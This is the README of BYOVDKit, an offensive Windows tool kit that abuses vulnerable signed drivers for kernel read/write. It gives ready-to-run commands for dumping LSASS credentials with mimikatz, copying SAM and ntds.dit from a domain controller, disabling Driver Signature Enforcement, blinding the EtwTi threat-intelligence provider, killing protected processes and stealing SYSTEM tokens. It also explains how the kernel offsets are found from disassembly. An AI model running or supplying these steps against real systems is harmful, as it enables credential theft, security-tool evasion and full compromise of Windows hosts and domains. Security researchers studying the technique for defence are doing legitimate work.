# BYOVDKit

BYOVDKit is a tool kit for utilizing vulnerable driver to perform various attack aka bring your own vulnerable driver (BYOVD) attack. I wrote this to

- make use of different vulnerable drivers easily (support DBUtil_2_3, RTCore64 and GIGABYTE). You can put your own driver read/write implementation in DriverOps.cpp and DriverOps.h

- calculate offset in runtime to avoid hardcoding offset

- review some of the code for learning purpose

- learn how to leverage kernel read write vulnerability

- learn kernel debug

I wont recommend you to use this in production environment as this project could cause BSOD due to PatchGuard/HVCI/etc or a wrong offset calculation. I didnt test with 32 bit system.

### Usage

```
.\BYOVDKit.exe <driver option> <argument>
        <driver option> - 0: Undefined, 1: DBUtil_2_3, 2: RTCore64, 3: GIGABYTE. Default DBUtil_2_3
Options:
Install Driver: installDrv <driver path> [service name]
Uninstall Driver: uninstallDrv <service name>
PPL options: PPL <check/disable> [PID]
        [PID] - default check or disable LSA protection
PPL options: PPL enable <PID> [<PP/PPL> <signer type>]
        [PP/PPL] - default PPL
        [signer type] - default WinTcb
DSE options: DSE <check/enable/disable/installUnsignDrv>
DSE options: DSE installUnsignDrv <driver path> <service name>
        installUnsignDrv - Install Unsigned Driver and revert DSE setting
Copy protected file: copy <file path>
Delete protected file: delete <file path>
Terminate protected process: kill <PID>
Copy Token: token <source PID> [target PID]
        [source PID] - input 4 to copy SYSTEM token
        [target PID] - default spawn cmd
EtwTi options: ETW <enable/disable/check>
```

#### Enable PPL to dump LSASS when LSA protection is on

```
.\BYOVDKit.exe 1 installDrv C:\dbutil_2_3.sys
.\BYOVDKit.exe 1 PPL enable <PID of mimikatz>
mimikatz # sekurlsa::logonpasswords
```

#### Copy NTDS on Domain Controller

```
.\BYOVDKit.exe 2 installDrv C:\RTCore64.sys
.\BYOVDKit.exe 2 copy C:\Windows\System32\Config\SAM
.\BYOVDKit.exe 2 copy C:\Windows\NTDS\ntds.dit
```

#### Install Unsigned Driver

```
.\BYOVDKit.exe 1 installDrv C:\dbutil_2_3.sys
.\BYOVDKit.exe 1 DSE installUnsignDrv C:\MyDriver.sys MyDriver
```

or do it step by step

```
.\BYOVDKit.exe 2 installDrv C:\dbutil_2_3.sys
.\BYOVDKit.exe 2 DSE check
.\BYOVDKit.exe 2 DSE disable
.\BYOVDKit.exe 0 installDrv C:\MyDriver.sys MyDriver
.\BYOVDKit.exe 2 DSE enable
```

#### Disable EtwTi

```
.\BYOVDKit.exe 3 installDrv C:\gdrv.sys
.\BYOVDKit.exe 3 ETW disable
```



### Calculate Offset in Runtime

##### EtwThreatIntProvRegHandle

As suggested in [method 1](https://securityintelligence.com/posts/direct-kernel-object-manipulation-attacks-etw-providers/), we can map `ntoskrnl.exe` into memory and read data at `KeInsertQueueApc` byte by byte until we hit `mov R10` to retrieve the offset. But during debugging, I found that the assembly code is `mov rcx` in my VM. The source code of `KeInsertQueueApc` may be different across different built of Windows. I only check for `mov R10` and `mov rcx` in this project. 

```
0: kd> uf nt!KeInsertQueueApc
nt!KeInsertQueueApc:
fffff807`60d13500 48895c2410      mov     qword ptr [rsp+10h],rbx
...
fffff807`60d13524 488b0d65e29100  mov     rcx,qword ptr [nt!EtwThreatIntProvRegHandle (fffff807`61631790)]
```

Disassemble the shellcode `488b0d65e29100` [here](https://defuse.ca/online-x86-assembler.htm#disassembly2) give us `mov  rcx,QWORD PTR [rip+0x91e265]`.  Clearly we can search for `\x48\x8b\x0d` to extract the virtual offset. Kernel base address could be retrieve through ` EnumDeviceDrivers` where Windows kernel being the first entry. So the global address = `address of \x48\x8b\x0d + 0x91e265 - mapped address of ntoskrnl.exe + kernel base address`

##### ProcessToken and ObjectTable

@itm4n's [blog post](https://itm4n.github.io/debugging-protected-processes/) show us that we can to extract the offset of `ProcessProtection` by reading data at `PsIsProtectedProcess`. By assuming those offsets always have same distance in the struct `_EPROCESS`, we can calculate offset `ProcessSignatureLevel = ProcessProtection - 0x2`.  Similarly, according to [this forum post](https://www.unknowncheats.me/forum/3411035-post9.html?s=78c170ef7a645916c3ac8783fc221c21), `ProcessToken = ProcessJob - 0x58` and I assume `ProcessObjectTable = ProcessDebugPort - 0x8` in this project.

```
0: kd> uf nt!PsGetProcessDebugPort
nt!PsGetProcessDebugPort:
fffff805`1cf75050 488b8178050000  mov     rax,qword ptr [rcx+578h]
fffff805`1cf75057 c3              ret
```

The offset of `ProcessDebugPort` is `0x0578` which could be extracted by reading data in address of`PsGetProcessDebugPort + 3`

```
0: kd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : Ptr64 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY
  ...
   +0x570 ObjectTable      : Ptr64 _HANDLE_TABLE
   +0x578 DebugPort        : Ptr64 Void
   ...
```

By inspecting the struct `_EPROCESS`, the offset can by calculate as `ProcessObjectTable = ProcessDebugPort - size of _HANDLE_TABLE`

##### g_CiOptions

@XPN's [blog post](https://blog.xpnsec.com/gcioptions-in-a-virtualized-world/) demonstrate how to search the global offset of `g_CiOptions`. This [BOF](https://github.com/NVISOsecurity/CobaltWhispers/blob/main/src/Drivers/DisableDSE/DisableDSE.c) has similar implementation which is adopted in this project. First we map `CI.dll` into memory. Reading data byte by byte at `CiInitialize` until we hit `mov     ecx,ebp`. 

```
0: kd> uf CI!CiInitialize
...
CI!CiInitialize+0x49:
fffff802`82433449 4c8bcb          mov     r9,rbx
fffff802`8243344c 4c8bc7          mov     r8,rdi
fffff802`8243344f 488bd6          mov     rdx,rsi
fffff802`82433452 8bcd            mov     ecx,ebp
fffff802`82433454 e8bb080000      call    CI!CipInitialize (fffff802`82433d14)
```

Shellcode `e8bb08` disassemble to `call   0x8bb+5` which indicate address of `CipInitialize` locate at `address of \xe8 + 0x8bb + 5`.

Similarly, we search for `mov     dword ptr` at address of `CipInitialize` to extract the offset of `CI!g_CiOptions` which is `0xfff4683`. 

```
0: kd> uf CI!CipInitialize
CI!CipInitialize:
fffff802`82433d14 48895c2408      mov     qword ptr [rsp+8],rbx
fffff802`82433d19 48896c2410      mov     qword ptr [rsp+10h],rbp
fffff802`82433d1e 4889742418      mov     qword ptr [rsp+18h],rsi
fffff802`82433d23 57              push    rdi
fffff802`82433d24 4154            push    r12
fffff802`82433d26 4156            push    r14
fffff802`82433d28 4883ec40        sub     rsp,40h
fffff802`82433d2c 498be9          mov     rbp,r9
fffff802`82433d2f 890d8346ffff    mov     dword ptr [CI!g_CiOptions (fffff802`824283b8)],ecx
```

Base address of `CI.dll` could be obtained with `NtQuerySystemInformation` and `(SYSTEM_INFORMATION_CLASS)11` which is `SystemModuleInformation`. Thus, global address = `address of \x89\x0d + 0xfff4683 - mapped address of CI.dll + base address of CI.dll`



### Elevated Handle To Copy Protected File

As implemented in KernelCactus, it can [elevate process handle and file handle](https://spikysabra.gitbook.io/kernelcactus/pocs/total-service-destruction) to terminate EDR process and delete files to destroy EDR service. I come up with one more use case of elevating file handle. We can copy any protected file including SAM/SYSTEM/SECURITY and NTDS by first opening file handle through `CreateFile`. Elevate the file handle and read the content through `MapViewOfFile`.



### References

- https://spikysabra.gitbook.io/kernelcactus/
- https://securityintelligence.com/posts/direct-kernel-object-manipulation-attacks-etw-providers/
- https://itm4n.github.io/debugging-protected-processes/
- https://blog.xpnsec.com/gcioptions-in-a-virtualized-world/
- https://github.com/NVISOsecurity/CobaltWhispers/blob/main/src/Drivers/DisableDSE/DisableDSE.c





